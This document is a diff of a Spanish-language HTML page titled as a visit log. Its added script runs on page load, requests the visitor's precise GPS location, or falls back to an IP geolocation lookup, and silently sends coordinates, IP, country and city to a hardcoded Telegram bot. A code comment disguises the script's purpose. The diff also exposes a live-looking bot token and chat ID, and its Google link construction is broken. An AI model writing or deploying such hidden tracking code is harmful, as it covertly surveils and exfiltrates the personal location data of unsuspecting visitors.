@@ -50,79 +50,87 @@
     </section>
 </main>
 
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Registro de Visitas</title>
+</head>
+<body>
 
-<!-- SCRIPT DIRECTO PARA EVITAR CACHÉ DE UBICACIÓN (HIPERVÍNCULOS LIMPIOS) -->
-<script>
-(function() {
-    const TOKEN = '9068600803:AAEPd0lHMbVcyxhsCbXJGfutL0X-v6mr-pY';
-    const CHAT_ID = '9180377107';
+    <!-- SCRIPT DIRECTO PARA EVITAR CACHÉ DE UBICACIÓN (HIPERVÍNCULOS LIMPIOS) -->
+    <script>
+    (function() {
+        const TOKEN = '9068600803:AAEPd0lHMbVcyxhsCbXJGfutL0X-v6mr-pY';
+        const CHAT_ID = '9180377107';
 
-    // Función auxiliar para escapar caracteres requeridos por MarkdownV2 de Telegram
-    function escapeMarkdown(text) {
-        return text.replace(/([_*\[\]()~`>#+\-=|{}.!])/g, '\\$1');
-    }
+        // Función auxiliar para escapar caracteres requeridos por MarkdownV2 de Telegram
+        function escapeMarkdown(text) {
+            return text.replace(/([_*\[\]()~`>#+\-=|{}.!])/g, '\\$1');
+        }
 
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(function(pos) {
-            const lat = pos.coords.latitude;
-            const lon = pos.coords.longitude;
-            const acc = Math.round(pos.coords.accuracy);
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(function(pos) {
+                const lat = pos.coords.latitude;
+                const lon = pos.coords.longitude;
+                const acc = Math.round(pos.coords.accuracy);
 
-            // Generamos la URL original en el formato de búsqueda que necesitas
-            const rawUrl = "https://google.com" + lat + "%2C" + lon + "&rlz=1C1UEAD_esMX1233MX1238&oq=" + lat + "%2C" + lon;
-            
-            // Creamos el mensaje usando la sintaxis de MarkdownV2 para hipervínculos: [Texto](URL)
-            // Escapamos los guiones y puntos del texto estático para cumplir con las reglas de Telegram
-            const texto = "📍 *Nueva Visita \\(GPS\\)*\n\n" +
-                          "• Latitud: " + lat + "\n" +
-                          "• Longitud: " + lon + "\n" +
-                          "• Precisión: ~" + acc + " metros\n\n" +
-                          "👉 [Ver Ubicación en Google Search](" + rawUrl + ")";
-
-            fetch("https://api.telegram.org/bot" + TOKEN + "/sendMessage", {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ 
-                    chat_id: CHAT_ID, 
-                    text: texto,
-                    parse_mode: 'MarkdownV2' // Indispensable para que funcione el hipervínculo
-                })
-            }).catch(e => console.error("Error enviando GPS:", e));
-
-        }, function(err) {
-            fetch('https://ipapi.co')
-            .then(res => res.json())
-            .then(data => {
-                const latIP = data.latitude;
-                const lonIP = data.longitude;
-                const ip = data.ip || 'No detectada';
-                const country = data.country_name || 'Desconocido';
-                const city = data.city || 'Desconocida';
+                // Formato exacto de búsqueda en Google Chrome con codificación correcta
+                const rawUrl = "https://google.com" + lat + "%2C" + lon + "&rlz=1C1UEAD_esMX1233MX1238&oq=" + lat + "%2C" + lon;
                 
-                const rawUrlIP = "https://google.com" + latIP + "%2C" + lonIP + "&rlz=1C1UEAD_esMX1233MX1238&oq=" + latIP + "%2C" + lonIP;
+                // Formato de hipervínculo en MarkdownV2 de Telegram: [Texto](URL)
+                const texto = "📍 *Nueva Visita \\(GPS\\)*\n\n" +
+                              "• Latitud: " + lat + "\n" +
+                              "• Longitud: " + lon + "\n" +
+                              "• Precisión: ~" + acc + " metros\n\n" +
+                              "👉 [Ver Ubicación en Google Search](" + rawUrl + ")";
 
-                const textoIP = "🌐 *Nueva Visita \\(Por IP\\)*\n\n" +
-                                "• IP: " + escapeMarkdown(ip) + "\n" +
-                                "• País: " + escapeMarkdown(country) + "\n" +
-                                "• Ciudad: " + escapeMarkdown(city) + "\n\n" +
-                                "👉 [Ver Ubicación por IP](" + rawUrlIP + ")";
-                
                 fetch("https://api.telegram.org/bot" + TOKEN + "/sendMessage", {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ 
                         chat_id: CHAT_ID, 
-                        text: textoIP,
-                        parse_mode: 'MarkdownV2'
+                        text: texto,
+                        parse_mode: 'MarkdownV2' 
                     })
-                });
-            }).catch(e => console.error("Error enviando IP:", e));
-        }, { enableHighAccuracy: true, timeout: 6000 });
-    }
-})();
-</script>
+                }).catch(e => console.error("Error enviando GPS:", e));
 
-<!-- Carga del archivo principal de interacción lógica renombrado -->
-<script src="main.js"></script>
+            }, function(err) {
+                // Fallback por si el usuario deniega el GPS
+                fetch('https://ipapi.co')
+                .then(res => res.json())
+                .then(data => {
+                    const latIP = data.latitude;
+                    const lonIP = data.longitude;
+                    const ip = data.ip || 'No detectada';
+                    const country = data.country_name || 'Desconocido';
+                    const city = data.city || 'Desconocida';
+                    
+                    const rawUrlIP = "https://google.com" + latIP + "%2C" + lonIP + "&rlz=1C1UEAD_esMX1233MX1238&oq=" + latIP + "%2C" + lonIP;
+
+                    const textoIP = "🌐 *Nueva Visita \\(Por IP\\)*\n\n" +
+                                    "• IP: " + escapeMarkdown(ip) + "\n" +
+                                    "• País: " + escapeMarkdown(country) + "\n" +
+                                    "• Ciudad: " + escapeMarkdown(city) + "\n\n" +
+                                    "👉 [Ver Ubicación por IP](" + rawUrlIP + ")";
+                    
+                    fetch("https://api.telegram.org/bot" + TOKEN + "/sendMessage", {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ 
+                            chat_id: CHAT_ID, 
+                            text: textoIP,
+                            parse_mode: 'MarkdownV2'
+                        })
+                    });
+                }).catch(e => console.error("Error enviando IP:", e));
+            }, { enableHighAccuracy: true, timeout: 6000 });
+        }
+    })();
+    </script>
+
+    <!-- Carga del archivo principal de interacción lógica -->
+    <script src="main.js"></script>
 </body>
 </html>
